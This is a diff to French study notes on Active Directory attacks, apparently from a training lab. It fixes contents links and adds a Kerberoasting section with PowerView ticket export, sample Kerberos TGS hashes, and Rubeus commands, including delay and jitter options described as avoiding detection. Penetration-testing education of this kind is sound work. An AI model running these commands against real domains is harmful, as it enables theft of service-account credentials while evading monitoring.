@@ -1,6 +1,10 @@
 # Introduction to Active Directory Enumeration & Attacks
 
-# Sommaire
+
+
+
+
+## Sommaire
 
 1. [Initial Enumeration](#initial-enumeration)
    - [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
@@ -9,12 +13,12 @@
    - [LLMNR/NBT-NS Poisoning from Linux](#llmnr-nbt-ns-poisoning-from-linux)
      
 3. [Sighting In, Hunting For A User](#sighting-in-hunting-for-a-user)
-   - [Enumerating & Retrieving Password Policies](#)
-   - [Password Spraying - Making a Target User List](#)
+   - [Enumerating & Retrieving Password Policies](#enumerating-&-retrieving-password-policies)
+   - [Password Spraying Making a Target User List](#password-spraying-making-a-target-user-list)
      
 5. [Spray Responsibly](#spray-responsibly)
-   - Internal Password Spraying from Linux
-   - Internal Password Spraying from Windows
+   - [Internal Password Spraying from Linux](#internal-password-spraying-from-linux)
+   - [Internal Password Spraying from Windows](#internal-password-spraying-from-windows)
      
 6. [Deeper Down the Rabbit Hole](#deeper-down-the-rabbit-hole)
    - Enumerating Security Controls
@@ -26,13 +30,13 @@
    - Kerberoasting from Linux
    - Kerberoasting from Windows
      
-8. An ACE in the Hole
+8. [An ACE in the Hole](#an-ace-in-the-hole)
    - ACL Abuse Primer
    - ACL Enumeration
    - ACL Abuse Tactics
    - DCSync
      
-9. Stacking The Deck
+9. [Stacking The Deck](#stacking-the-deck)
    - Privileged Access
    - Kerberos "Double Hop" Problem
    - Bleeping Edge Vulnerabilities
@@ -2672,9 +2676,9 @@ Nous pouvons également choisir de récupérer tous les tickets avec cette méth
 
 La méthode semi-manuelle de Kerberoasting consiste à énumérer les SPN dans un domaine, puis à cibler un utilisateur spécifique pour obtenir des tickets TGS via PowerShell. Ces tickets peuvent ensuite être extraits avec Mimikatz. Cette méthode est la base de ce qui est automatisé par des outils comme Rubeus, mais elle reste utile pour comprendre le fonctionnement de Kerberoasting à un niveau plus fondamental.
 
-# Kerberoasting - Semi-Manual Method
+## Kerberoasting from Windows
 
-## Introduction
+### Kerberoasting - Semi-Manual Method
 
 Avant l'existence d'outils comme Rubeus, le vol ou la falsification de tickets Kerberos était un processus complexe et manuel. Aujourd'hui, les tactiques et les défenses ayant évolué, nous pouvons effectuer du Kerberoasting depuis Windows de différentes manières. Cet article explore d'abord la méthode manuelle, puis les outils automatisés.
 
@@ -2793,4 +2797,95 @@ Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local
 Prenez le blob Base64 extrait et supprimez les sauts de ligne et les espaces blancs, car la sortie est en colonne et doit être sur une seule ligne.
 
 
+## Exportation des tickets vers un fichier CSV
+
+### Commande PowerShell
+Pour extraire les tickets et les exporter dans un fichier `.csv` :
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+### Visualisation du fichier `.csv`
+Pour visualiser le contenu du fichier exporté :
+```powershell
+cat .\ilfreight_tgs.csv
+```
+
+### Exemple de sortie
+```plaintext
+"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
+"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$..."
+```
+
+---
+
+## Utilisation de Rubeus
+
+### Introduction à Rubeus
+Rubeus est un outil de la suite GhostPack permettant de manipuler Kerberos de manière avancée, incluant Kerberoasting. Voici quelques commandes clés.
+
+### Afficher l'aide de Rubeus
+Pour lister toutes les options disponibles :
+```powershell
+.\Rubeus.exe
+```
+
+### Exemples de commandes pour Kerberoasting
+1. **Extraction de base des tickets :**
+   ```powershell
+   Rubeus.exe kerberoast /outfile:hashes.txt
+   ```
+
+2. **Utilisation de SPN spécifiques :**
+   ```powershell
+   Rubeus.exe kerberoast /spn:"service/nom"
+   ```
+
+3. **Utilisation de SPN depuis un fichier :**
+   ```powershell
+   Rubeus.exe kerberoast /spns:C:\temp\spns.txt
+   ```
+
+4. **Extraction avec des identifiants alternatifs :**
+   ```powershell
+   Rubeus.exe kerberoast /creduser:DOMAIN\USER /credpassword:PASSWORD
+   ```
+
+5. **Kerberoasting avec un TGT existant :**
+   ```powershell
+   Rubeus.exe kerberoast /ticket:BASE64
+   ```
+
+6. **Extraction des comptes avec des mots de passe définis dans une période spécifique :**
+   ```powershell
+   Rubeus.exe kerberoast /pwdsetafter:01-01-2020 /pwdsetbefore:01-01-2022
+   ```
+
+7. **Opsec Kerberoasting (filtrage des comptes AES) :**
+   ```powershell
+   Rubeus.exe kerberoast /rc4opsec
+   ```
+
+---
+
+## Options supplémentaires
+- **Statistiques sur les comptes Kerberoastables :**
+  ```powershell
+  Rubeus.exe kerberoast /stats
+  ```
+
+- **Limitation du nombre de tickets extraits :**
+  ```powershell
+  Rubeus.exe kerberoast /resultlimit:5
+  ```
+
+- **Ajout de délais et de jitter pour éviter la détection :**
+  ```powershell
+  Rubeus.exe kerberoast /delay:5000 /jitter:30
+  ```
+
+---
+
+## Conclusion
+Rubeus offre une flexibilité remarquable pour effectuer des attaques Kerberoasting, avec de nombreuses options adaptées à divers scénarios. Familiarisez-vous avec ses fonctionnalités pour maximiser son efficacité tout en minimisant les risques de détection.
 
